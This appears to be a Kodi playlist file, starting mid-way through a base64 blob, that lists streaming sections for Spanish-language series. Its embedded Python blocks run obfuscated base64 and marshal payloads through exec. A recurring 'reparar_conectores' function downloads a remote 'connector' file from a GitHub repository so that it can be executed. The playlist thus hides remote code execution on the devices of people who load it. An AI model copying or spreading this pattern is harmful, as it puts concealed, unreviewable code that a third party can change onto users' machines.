TJwd1NYRmtXbmR4VlhCUlRVbEpZVk0yUkVsWGFIQjZjV2xhZVhsWlNGSjVNMHhIVFcxSlMxcHRjR0ZFYkVKSU1WUnZVazFyVFcxSlZrRXhlWGR4VWpsMVIxQm5RWEpTZVVGQlNEQmxjbEYxUWtGUlRVbEZTbE5LYmxKeGRVaDVZbWxKUzJOa1RUQlhSa1ZoVjFGdWJYVlBTRWhUVWtoVU1WUk5TVWt5V1cxME1FSkpWMGhNUzNGWWJrbElOVmd3TlZSRU1VdzFiMHBCYkZveVUwRmFTMVpwY0ZORlpFd3pZMWR1TTA1bFNubEpabTVoVTJad2JVRjJjRkZYWWt4NFNUQndTRTFUVFVkTmFFSlRXbXB2UjBVelFVcFNha0V5T1ZGSU1GTmxjREpqTWsxU1JEVllNM0Z0VEVkMVdXNHlPRFJ2UzA0eGNYaE5iVWt3WTJaS2QxSnNjbEoxWjI0elQyTk5TbkZ1YjBoclprVXdVMkZhU21JelFVcDFOa1p0UVdwSlZIVm1UREJUZWxwaFQwRkhSMHh0VEVwNWQwbGhZMXBDVW5WbGIxTk9OVzh5TkRKd1ZFMVRSM2RCVlVGUldtbEZVMEZvY1hsQlVFd3laMVJaTVU5TVdsSkJhWEpVTVZKQk0wOWhXbmhCWlVGS1kwRk5lR2R0VEVobmJIQktZalJITUZkUFFVZDVZMHgzVFZwYVZEbFhRVkZNYVVneFdqQkhVM2xMV2xSRlJWbHRWMUZaTUZNMGNEQmpibkpUU1hkeFJtWnJXakZGTW5Fd1UyTkVNVTR5UjNveGVrMWhZMVZ2ZWt3MWIyMVBTVzh5VFVSSFIzazFTVEI1TlV3eFJVTk5SMHcwVERCclpVRlVNREJ1ZUVsaVNESmpXRVJIUkRWQk1rbEZXVEExUzFwU1kxWnZZWFZSVFRCWGJYSjNTWGh2TWt4bFJubE5lbTVWVDBOQlVYZ3lSVWg1VFVGVlQyMU1NakZZV25oalUwSlNWMkphZVVRd2J6QlhaVmd3UVVWQlVVMWpibEZ4YW00eVJXTnZWR041Y0VwVFNVRjNVMHh1VkhCc2IwdDVhMXBWV2pCeGJWZFJRVEoxTUVsSGVWRkZSM2xQVEVwTllrRjNkR1Z2VW10UlJUQk5aVWRLWmpKRVMxSmxSWGhqVFhGSlZqUnVTM2xuY0VsWGExZ3ljR1ZOUjNGSVdEQm5XVnAzVDFwQlNFazJSVXBXTVhCVmRVeHlWVXd4UVcxU05HNVNWMlZ3UzAxcmJ6SkJTMHg2ZFZkWU1uVjJiM2xCUWtkM2NEVkJkMEZUUm5wRWJFMVJRV2xOZUVGaVJWTlhXVzVLUlRGTk1uVjVUR0YxZDAxSU9URkdWVk5sUVRKNWEzRXpVMlJhZVVGalJWUkZVM0Y2TlhkSlNIUnBSMGhTYkc5M1JWRkJWVTV0VFRCbk5rSklRWGx1TTFJd1REQkpOVUZSVDFaR01WWXdXREJuZUVGSU9YVkpNMGxKY1RKRmRVcEhTV3RITTFveGJtRlBhbHBLWjIxRlVYbEpRV0ZCYlc5NWRXbEZlbXN4UVhwNGFWZ3hkVUZ2VkZNMVFWTlBObTV0VFdod2Vtc3ljbmQ1VWtGNGEwOUZkMFZaVFhwV00yNHhlVkJOTVZOMlJVZFRZMGgzY0dsRlVrRXdTVlZTYlVkSGNXeEZiWGt4Y1RKclEwZ3lVbVZNTVVsUWNUQlhlRWRKVjJSYWVVUXhRWGxQTmtGS1oxbFpiRGxqV2xSalRFd3lTR3BFTVVsSlFYcDVlRWhLZURKTlNsTmlRWGxKWjFreU1HbGFVMDluUWxGUFZHOUhlVlpOVkVGaldtMVhSVUZIY1Zad00wRlpXbmxTWlhCNWNWbHlTRmQ1V1RCbk1rWjJPV3hIUjA5clNFbzVkVVF3ZVhsR1ZHTkVXRE5YTlVaS1lqVlliVTR6U0VsTlRYSjRSREJCYlhGbmNYZzVNMGxWWTBGeVZGSXpSVlZCVDFsdGNURlpNbmhwY1hwMU5WcExlVkZIWVVGSFRHRk5RMEpVYTA5TVNIRnNSa2xUWlVwaFUwbEJTMXBxU1VoQlpFRlFPV0ZLZUhGbWNWVlhNVmxzT1VKQlZHWTFUREpuWVZremVXNU5VbkJsVEVocmFVRjRaM1p5VlVGcVRYZDRNa1pzT0cxeFZFMVhTRzFOUkhCdFRERmFiRGt6UnpCME5WbHRlV0p1YlVWWFdUTlROVVIzZEcxQlZYZ3dXVEZ4VWtoTFZtbEpTalV6YmxGWFZsa3laakp3TVVWM1dXMXhRMGxLUlVWRVMzVXlXbE5JYVc1NlFVaHZWSEZwUkRKeFNXNUxXakZ1YkRneWNGUnhSVUpHWjIxSU1IUmxiMG81V2tSSVREUkZNVkpsY2xOMVNIRjJPVlZLUm1kUldESkpVMXBVVmpKdlNIQnRiMjE1WjNCSlQwMU5VVkpsUkhwbWExcHRWMnh1U0dadGJ6SnJUWEZIVFRWYVZEQTBiekpGZDI1VVZqVnhWREZXYnpCaldGcDNlVU5KUjFjemIwaFNiVTEzZEdsTlZFMVBSMHR3TlVWUmRYWnllRUZMY1RKTU1tNTJaMkp4U1hsaVRXMVhhMEpWU1dKR1VEbFJSakJFYTBaaFQyVktTbGRwY1ZSamVYQXlTVTFaYkRsSmNFZEJSM0JKZVRWd1NrVnBSRzFGYVhBelRXbENWVk5qYm5kMVNreHRValJ3U25Fd1FYcDVNRzlIZFcxeVIwMWpibE5KZVZnelYwOUdVRGxUY2tvNVNYSkhSR1ZOYlZkRlRVZEJaMFZ0ZEdsTWVqUnBTVEJtTTBVeVVtbE1TamxhU1ZWSmJWbHNPVTF5U2tocFdUTlBhVTEzY1dsSlNtZHBiMGhUZFV3d1lteENVWEJwV1RKME1YQnRlV1Z4TTBGQmNWRkZWa1JIUkdsQlVsWTBXREpKYkV4aFFWZHZVbGN3YjNZNVJVRkhlVzFNUm1kclFrcG5Na1JzT0cxQmJWTkxRVXRQVVZneWRXcEdTVVZCU1VZNWJWZ3hTV0pCVlVFMVJXMU5ibkJJUVRGd1lYQnBRbFJNTWtkVWRXMXVTMEZpUkRJd01VbHRkVmRITTFONGJsUTVWRm93Wm1WQ1VEbG1ia2hyVVVFeVNHVkdlVWxsY0ZSRlFWa3hUMjFFTWxOSldUSnJhMFJ0UVRWQlVEbHRUVkpuWTFreU1XWkNTamcxV1RKYWFWZ3hVelZ3YkRsUldrZFNaVmd5VTNad1NqRXhURXRhYVVkNVNWVkZlbE15UjNjd1lWRkVZelp1U2psb1ZsRXdkRmN4YXpSQmJWZHdjbEZOZWt0VmRETkJVMnMwV20xVGNISlJXbTFYYWpCWWIzcEphVlpSTUhSTlMwMTFiMUIwWVV0VmRESmFlV3MwUVhkNWNISlJUWGxMVlhReVdrbHJORUZ0UVhCeVVVeHRTMVYwTWtKSmF6UkJkM2x3Y2xGWGVVdFZkRE5CU1dzMFFYcEpjSEpSVERSTFZYUXlRVWxyTkVGdGRYQnlVVTEzUzFWME1rSkphelJCZDAxd2NsRndOVXRWZEd4Q1UyczBRWHBGY0hKUlRYcExWWFF6V25sck5FRnRUM0J5VVV3MFMxVjBNa0ZKYXpSQmJVbHdjbEZ3YlV0VmRHeENTV3MwV25kT1lWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReldqRnJORnA2U1hCeVVVd3dTMVYwTWtGSmF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVmpSTFZYUXpRVk5yTkVGdFYzQnlVVXcxUzFWME1rMUphelJCZDNsd2NsRndNRXRWZEROQ1NXczBXbnBCY0hKUlZtcExWWFF6VEVsck5FRjNlWEJ5VVUxNlMxVjBNazFKYXpSYWQzaGhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNWM0J5VVV3MVMxVjBNazFKYXpSQmQxTndjbEZ3YlV0VmRESmFNV3MwUVhkNWNISlJURFZMVlhSc1RVbHJORUZ0U1hCeVVVMTVTMVYwTWtKVGF6UkJkMGx3Y2xGd05FdFZkREpNTVdzMFFYZDVjSEpSVERKTFZYUXpRa2xyTkZwM2RYQnlVVTE2UzFWME0xcDVhelJCZDFOd2NsRk1iVXRWZERKTU1XczBRWGRKY0hKUlZqVlhiSGgwV0d4UGVYRjZVMlpZVUhGd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFF5V2pGck5FRnRRWEJ5VVZkNVMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhSc1FsTnJORUY2VjNCeVVVd3hTMVYwTTBKSmF6UkJla1Z3Y2xGTWEwdFZkREpNZVdzMFFYZEpjSEpSY0d4TFZYUnNXbE5yTkZwNlFYQnlVVlpxUzFWME0weEphelJCZDNsd2NsRk5la3RWZERKTlNXczBXbmQ0WVZoRU1GaE5TMDExYjFCMWQyOHlNV3B1U210NVdGVmpabTVLVm1oTlZFbDNiekl4YW5CNlNXMXdiSFYyVEV0QmVVRjNSR2hNZDB3d1RWUkpkMjh5UlhsWVZFa3lURXBxWWxjeGF6UkJla2x3Y2xGTU1VdFZkREpOZG5CaldFWjRabGR0YTIxeFZWZGpiM3B3SzFkc2FtRk5TM1Y1VEd4d1kxaEVQVDEwQlFBQUFISnZkREV6Y3drQUFBQnRiM0p3YUdWMWN5QnpIQUFBQUdOdlpHVmpjeTVrWldOdlpHVW9kSEpwYm1sMGVTd2dlbWx2YmlsMEJnQUFBRzl5WVdOc1pYTWVBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaHJaWGx0WVd0bGNpQXNJSHBwYjI0cGRBTUFBQUJ1Wlc5ekNBQUFBRHh6ZEhKcGJtYytkQVFBQUFCbGVHVmpLQXNBQUFCMEJnQUFBR0poYzJVMk5IUUdBQUFBWTI5a1pXTnpkQWdBQUFCdGIzSndhR1YxYzNRSEFBQUFkSEpwYm1sMGVWSUVBQUFBZEFnQUFBQnJaWGx0WVd0bGNuUUVBQUFBZW1sdmJuUUVBQUFBWlhaaGJGSUZBQUFBZEFjQUFBQmpiMjF3YVd4bGRBa0FBQUJpTmpSa1pXTnZaR1VvQUFBQUFDZ0FBQUFBS0FBQUFBQnpCZ0FBQUhOamNtbHdkSFFJQUFBQVBHMXZaSFZzWlQ0QkFBQUFjdzRBQUFBWUFRWUJCZ0VHQVFZQkJnRXFBUT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/5kY0BRB.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 <item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Turcas[/COLOR]</title>
<link>$doregex[lou]</link>
<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/PASARELA.SERIES.TURCAS</externallink>
<thumbnail>https://i.imgur.com/w6VUR30.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [COLOR white]Dilo[/COLOR]</title>
<link>NOLINK</link>
<thumbnail>https://i.imgur.com/T4DbHGd.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
 <externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/Series.Dilo</externallink>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]SeriesFlv[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[COLOR lightseagreen]SeriesFlv [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/inVXax6.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<link>$doregex[makelist2]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('Buscador', 'search', ''), ('Mas Vistas en la Semana', 'semana', ''), ('De La A a la Z', 'letra', '')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>$pyFunction:('[COLOR gold][COLOR white][CAPITALIZE][makelist2.param3][/CAPITALIZE][/COLOR]').replace('-',' ')</title>
<info>[COLOR white][CAPITALIZE][makelist2.param3][/CAPITALIZE][/COLOR]</info>
<link>$doregex[makelist]</link>
<thumbnail>$doregex[img]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR gold][makelist.param1][COLOR white][makelist.param3][/COLOR]</title>
<link>$doregex[m]</link>
<thumbnail>$doregex[img]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<info>[COLOR gold][makelist.param1][COLOR white][makelist.param3][/COLOR]</info>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param1]'
name = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>m</name>
<listrepeat><![CDATA[
<title>[COLOR white][m.param2] [COLOR lightskyblue][m.param3] [COLOR gold][m.param1][/COLOR]</title>
<title></title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>$doregex[img]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<info>[COLOR white][m.param2] [COLOR lightskyblue][m.param3] [COLOR gold][m.param1][/COLOR]</info>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
name = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<expres>var palabra = "(.*?)"</expres>
<page>https://seriesflv.org/[m.param4]</page>
</regex>
<regex>
<name>img</name>
<expres><![CDATA[#$pyFunction
finalurl = '[makelist2.param4]'
import re,requests,xbmc,urlresolver
def GetLSProData(page_data,Cookie_Jar,m,finalurl=finalurl):#cLrJIhsDApL
  if 'http' in finalurl:
   return finalurl
  else:
   return 'https://i.imgur.com/inVXax6.jpg'
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/x2NNTMr.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------

 <item> 
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Teleseries[/COLOR]</title> 
<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/teleseries.txt</externallink> 
<link>na</link> 
<thumbnail>https://i.imgur.com/vkbwOMp.png</thumbnail>
<fanart>https://i.imgur.com/i6rVUIV.jpg</fanart>
</item>
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]Cristal Top 20[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHR4VUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVrVXpUbFJWZDA1dFdYcE5SR040VFhwWmVrNVVXVEpPZWxVeFRucE5OVTV0VlhsYWFsVTFUWHBCTWxwVVdteE9WR3Q2VFhwVk1FNTZSVE5PUkZFeFRsUkpNazE2VFROT01rVjZUbnBWTlUxNlFURk5SRlV5VGtkSmVrNUVZek5PUkVrd1RYcFZOVTU2VFRCTmFsSnJUa1JSTTA1cVkzaE9SRWw1V1dwamVrNVVUVEphUkZwc1RrZFJlazlFVVRST1ZHc3lXV3BTYUUxNlJUQmFhbEpxVG5wSmVWcHFTbWxPZWtrd1RXcFZNazV0U1RGT2FsVXlUWHByZWsxRVVteE9SMFV6VFZSUk5FNVVWVEZOZWxwcVRtMU5NRTFVWXpST1JHY3dUV3BaTUUxNlkzbFphbU42VGpKRmVWcHFWVEZPYWxrelRtcE5NVTE2UlROT2FrcHBUbXBaZWsxNlRUTk5iVWt5VG1wak1FNTZXVE5OUkVwdFRYcGpNVTlFVlRSTmJWbDZUbnBhYUU1NlVYcE5SRlUwVG1wcmVWcHFXVEpPZWtrd1dYcGplVTE2WTNsWmFrMDBUbFJaTWs1cVZUUk5lbXQ1V21wWk1VNUhXWHBOZWsxM1RXMVpNRTlFWXpKTmVsVjZUbXBaTWs1SFJURlBSRTE2VFhwak1sbFVXVFZPZWxreldWUmpNazU2V1hsYWFrMHhUbFJOZWsxNldUQk5iVmt6VFdwTmVFMXRXVEZOUkZwb1RYcGplazU2U20xTmVtdDZUMVJaZVU1cVdUSk9hbFpvVGxSUmVWb